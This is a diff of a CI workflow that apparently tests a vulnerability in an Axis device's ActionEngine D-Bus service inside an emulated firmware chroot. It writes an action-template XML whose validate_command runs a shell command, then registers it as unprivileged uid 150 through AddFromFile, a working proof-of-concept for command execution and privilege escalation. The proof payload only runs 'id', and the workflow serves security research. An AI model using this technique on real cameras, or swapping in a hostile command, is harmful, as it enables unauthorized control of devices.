@@ -146,23 +146,23 @@ jobs:
           timeout 20 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl --no-pager introspect com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine 2>&1 | head -30
           echo "=== add-action-template file (validate_command carries the proof payload) ==="
           sudo tee /opt/rootfs/tmp/ae_poc.xml > /dev/null <<'XML'
-<action>
-  <id>com.axis.action.poc.ae001</id>
-  <action_type>one_shot</action_type>
-  <parameters>
-  </parameters>
-  <commands>
-    <validate_command>
-      <exec_command>
-        <path>/bin/sh</path>
-        <exec_argument>-c</exec_argument>
-        <exec_argument>id > /tmp/proof_ae 2>&1</exec_argument>
-      </exec_command>
-    </validate_command>
-  </commands>
-</action>
-XML
-sudo chmod 644 /opt/rootfs/tmp/ae_poc.xml
+          <action>
+            <id>com.axis.action.poc.ae001</id>
+            <action_type>one_shot</action_type>
+            <parameters>
+            </parameters>
+            <commands>
+              <validate_command>
+                <exec_command>
+                  <path>/bin/sh</path>
+                  <exec_argument>-c</exec_argument>
+                  <exec_argument>id > /tmp/proof_ae 2>&1</exec_argument>
+                </exec_command>
+              </validate_command>
+            </commands>
+          </action>
+          XML
+          sudo chmod 644 /opt/rootfs/tmp/ae_poc.xml
           echo "=== uid 150 calls AddFromFile through the dbus policy (setresuid inside chroot) ==="
           timeout 25 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /usr/bin/busctl call --no-pager com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine/ActionTemplate com.axis.Event.ActionEngine.ActionTemplate AddFromFile s "/tmp/ae_poc.xml" 2>&1 | head -10
           echo "=== addcall exit: $? ==="
